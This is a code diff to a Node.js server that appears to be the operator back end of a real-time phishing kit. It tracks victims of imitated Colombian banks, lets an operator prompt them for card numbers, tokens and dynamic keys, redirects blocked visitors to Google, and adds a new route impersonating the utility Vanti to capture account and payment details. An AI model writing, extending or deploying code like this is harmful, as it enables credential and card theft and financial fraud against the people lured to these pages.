@@ -317,7 +317,19 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'POST' && matchAccion) {
                 const sessionId = decodeURIComponent(matchAccion[1]);
                 try {
-                    const { accion } = await getBody(req);
+                    const body = await getBody(req);
+                    const { accion } = body;
+                    
+                    if (accion === 'PONER_PRECIO') {
+                        const { valor } = body;
+                        if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
+                        estadoSesiones.set(sessionId, 'precio_asignado');
+                        ultimaAccionSesiones.set(sessionId, String(valor));
+                        agregarLog('poner-precio', { usuario: payload.user, sessionId, valor });
+                        json(res, 200, { ok: true, estado: 'precio_asignado', accion: String(valor) });
+                        return;
+                    }
+
                     const mapEstados = { 
                         ACEPTAR: 'aceptado', 
                         RECHAZAR: 'rechazado', 
@@ -325,7 +337,7 @@ const server = http.createServer(async (req, res) => {
                         TOKEN: 'token', 
                         FINALIZAR: 'finalizado', 
                         CC_ERROR: 'cc_error', 
-                        AUTORIZAR: 'autorizacion_enviada', // 🔥 Ahora AUTORIZAR solo cambia el estado, no explota
+                        AUTORIZAR: 'autorizacion_enviada',
                         PEDIR_CC: 'pedir_cc', 
                         PEDIR_DATOS: 'pedir_datos', 
                         PEDIR_DINAMICA: 'pedir_dinamica' 
@@ -337,7 +349,7 @@ const server = http.createServer(async (req, res) => {
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
                     console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
-                } catch (e) { json(res, 400, { ok: false }); }
+                } catch (e) { json(res, 400, { ok: false, error: e.message }); }
                 return;
             }
 
@@ -537,6 +549,26 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // ============================================================
+        // 🔥 RUTAS PARA VANTI
+        // ============================================================
+        if (req.method === 'POST' && url === '/vanti/enviar') {
+            try {
+                const datos = await getBody(req);
+                const { sessionId, empresa, cuenta, medioPago } = datos;
+                if (!sessionId) { json(res, 400, { ok: false }); return; }
+                
+                const datosSesion = { sessionId, bancoKey: 'vanti', empresa, cuenta, medioPago, ip, creadoEn: new Date().toISOString() };
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosSesion);
+                ultimaAccionSesiones.set(sessionId, '');
+                
+                console.log(`[VANTI] Nueva sesión: ${sessionId} | Cuenta: ${cuenta}`);
+                json(res, 200, { ok: true, sessionId });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
         const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
         if (req.method === 'POST' && enviarMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -601,7 +633,7 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && estadoMatch) {
             const bancoKey = estadoMatch[1];
             const sessionId = estadoMatch[2];
-            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
+            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti';
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
